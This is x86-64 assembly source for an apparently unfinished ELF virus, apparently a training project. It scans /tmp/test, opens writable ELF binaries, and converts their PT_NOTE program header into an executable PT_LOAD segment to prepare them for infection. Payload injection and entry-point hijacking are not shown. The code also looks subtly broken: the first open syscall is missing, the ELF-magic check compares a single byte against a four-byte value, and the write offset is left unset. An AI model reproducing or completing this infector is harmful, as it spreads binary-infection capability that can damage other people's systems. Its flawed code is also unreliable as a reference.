%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_STAT 4
%define SYS_FSTAT 5
%define SYS_PREAD64 17
%define SYS_PWRITE64 18
%define SYS_EXIT 60
%define SYS_CHDIR 80
%define SYS_GETDENTS64 217

%define S_IFDIR 0x4000
%define O_RDONLY 00
%define S_IFMT 0xf000

%define FAMINE_STACK_SIZE 5000
%define DIRENT_BUFFSIZE 1024

%define EHDR_SIZE 64
%define PHDR_SIZE 56
%define PT_NOTE	4
%define PT_LOAD 1

%define PF_X 1
%define PF_W 2 
%define PF_R 4 
; r15 /tmp/test
; r15 + 16 /tmp/test fd
; r15 + 32 struct stat
;	r15 + 32 dev inode_number
;	r15 + 32 + 24 stat.st_mode
; 	r15 + 80 stat.st_size

; r15 + 176 struct dirent (sizeof dirent 280)
; 	r15 + 176 d_ino
; 	r15 + 176 + 8 d_off
; 	r15 + 176 + 16 rec_len
; 	r15 + 176 + 18 d_type
; 	r15 + 176 + 19 d_name

; r15 + 1300 Ehdr64
; 	🦓 r15 + 1300 = ehdr
; 	🐴 r15 + 1304 = ehdr.class
; 	🦄 r15 + 1308 = ehdr.pad
; 	🦓 r15 + 1324 = ehdr.entry
; 	🐴 r15 + 1332 = ehdr.phoff
; 	🦄 r15 + 1354 = ehdr.phentsize
; 	🦓 r15 + 1356 = ehdr.phnum
; 	🐴 r15 + 1364 = phdr.type
; 	🦄 r15 + 1368 = phdr.flags
; 	🦓 r15 + 1372 = phdr.offset
; 	🐴 r15 + 1380 = phdr.vaddr
; 	🦄 r15 + 1388 = phdr.paddr
; 	🦓 r15 + 1396 = phdr.filesz
; 	🐴 r15 + 1404 = phdr.memsz
; 	🦄 r15 + 1412 = phdr.align

; r15 + 1420 binary_fd
; r15 + 1424 Phdr64
;		r15 + 1424	p_type;		
; 		r15 + 1428	p_flags;	
; 		r15 + 1432	p_offset;		
; 		r15 + 1440	p_vaddr;	
; 		r15 + 1448	p_paddr;	
; 		r15 + 1456	p_filesz;	
; 		r15 + 1464	p_memsz;	
; 		r15 + 1472	p_align;	
; r15 + 1420 binary_fd

; r15 + 1484 	phdr_num counter
; r15 + 1488	pt_load value buffer address
; r15 + 1492	program original entry point

global _start

	section .text
_start:
	S_IRUSR equ 256 ; Owner has read permission
	S_IWUSR equ 128 ; Owner has write permission

	push rbp
	push rdx
	push rsp
	sub  rsp, FAMINE_STACK_SIZE
	mov r15, rsp    
	mov qword [r15], '/tmp'
	mov qword [r15 + 4], '/tes'
	mov qword [r15 + 8], 0x00000074

	mov rdi, r15
	mov [r15 + 16], rax
	test rax,rax
	js _end		; if open fails, exit silently

	mov rdi, r15
	lea rsi, [r15 + 32]
	mov rax, SYS_STAT
	syscall

_is_dir:
	lea rax, [r15 + 32 + 24]
	mov rcx, [rax]
	mov rdx, S_IFDIR

	and rcx, S_IFMT

	cmp rdx, rcx
	jne _end ; if failure, exit

_diropen:
	mov rdi, r15
	mov rsi, O_RDONLY
	mov rax, SYS_OPEN
	syscall

	test rax, rax
	js _end  ; end if open fails

	mov [r15 + 16], rax ; saving  /tmp/test open fd for later

_change_to_dir:
	lea rdi, [r15]
	mov rax, SYS_CHDIR
	syscall

_dirent_tmp_test:
	mov rdi, [r15 + 16]
	lea rsi, [r15 + 176]
	mov rdx, DIRENT_BUFFSIZE
	mov rax, SYS_GETDENTS64
	syscall

	cmp rax, 0
	je _close_folder

	xor r14, r14
	mov r13, rax
_dirent_loop:
	movzx r12d, word [r15 + 176 + 16 + r14]

	; mov rax, SYS_WRITE
	; mov rdi, 1
	; lea rsi, [r15 + 176 + 19 + r14] ; dirent->name
	; mov rdx, 4
	; syscall

	; mov rax, SYS_WRITE
	; mov rdi, 1
	; mov word [r15 + 4000], 10
	; lea rsi, [r15 + 4000]
	; mov rdx, 1
	; syscall

_stat_file:
	lea rdi, [r15 + 176 + 19 + r14]
	lea rsi, [r15 + 32]
	mov rax, SYS_STAT
	syscall

_check_file_flags:
	lea rax, [r15 + 32 + 24]
	mov rcx, [rax] ;;; rcx & S_IRUSR === 1   
	and rcx, S_IRUSR
	test rcx, rcx
	jz _continue_dirent

	lea rax, [r15 + 32 + 24]  
	mov rcx, [rax]
	and rcx, S_IWUSR   ;;;; rcx & S_IWUSR == 1
	test rcx, rcx
	jz _continue_dirent

	lea rax, [r15 + 32 + 24]
	mov rcx, [rax]
	mov rdx, S_IFDIR
	and rcx, S_IFMT
	cmp rdx, rcx
	je _continue_dirent ; checks if its a directory

	cmp dword [r15 + 80], 64 ; checks that the file is at least as big as an ELF header
	jl _continue_dirent

_open_bin:
	lea rdi, [r15 + 176 + 19 + r14]
	mov rsi, 0x0002 ; O_RDWR 
	mov rdx, 0644o
	mov rax, SYS_OPEN ;; open ( dirent->d_name, O_RW)
	syscall

	mov qword [r15 + 1420], rax									 ; save fd
	mov rdi, rax                                         ; rax contains fd
	lea rsi, [r15 + 1300]                                ; rsi = ehdr = [r15 + 144]
	mov rdx, EHDR_SIZE			                                 ; ehdr.size
	mov r10, 0                                           ; read at offset 0
	mov rax, SYS_PREAD64
	syscall

_is_elf:
	cmp byte [r15 + 1300], 0x464c457f
	jne _close_bin

_save_entry_dpuente:  ;; very important!!!
	xor rax, rax

	mov byte [r15 + 1484], 0
_read_phdr:
	mov word r9w, [r15 + 1484]
	cmp word [r15 + 1356], r9w
	je _close_bin

	lea rsi, [r15 + 1424]; phdr
	mov rdx, PHDR_SIZE
	mov r10, [r15 + 1484]
	imul r10,r10, PHDR_SIZE
	add r10, EHDR_SIZE
	mov rax, SYS_PREAD64
	syscall

	cmp word [r15 + 1424], PT_NOTE ; phdr->type
	jne _next_phdr

	;; pwrite(fd, buff, size, off)

_change_ptnote_to_ptload:
	mov dword [r15 + 1424], PT_LOAD

_change_mem_protections:
	mov dword [r15 + 1428], PF_R | PF_X

_write_header_changes_to_bin:
	mov rdi, [r15 + 1420]
	lea rsi, [r15 + 1424]
	mov rdx, PHDR_SIZE
	; mov r10, r10
	mov rax, SYS_PWRITE64
	syscall
	

	jmp _close_bin


_next_phdr:
	inc word [r15 + 1484]
	jmp _read_phdr


_close_bin:
	mov qword rdi,[ r15 + 1420]
	mov rax, SYS_CLOSE
	syscall

_continue_dirent:
	add r14, r12
	cmp r14, r13
	jne _dirent_loop

	jmp _dirent_tmp_test


_close_folder:
	mov rdi, [r15 + 16]
	mov rax, SYS_CLOSE
	syscall
	

	jmp _end
_end:
	add  rsp, FAMINE_STACK_SIZE
	pop rsp
	pop rdx
	mov rax, SYS_EXIT
	xor rdi, rdi
	syscall
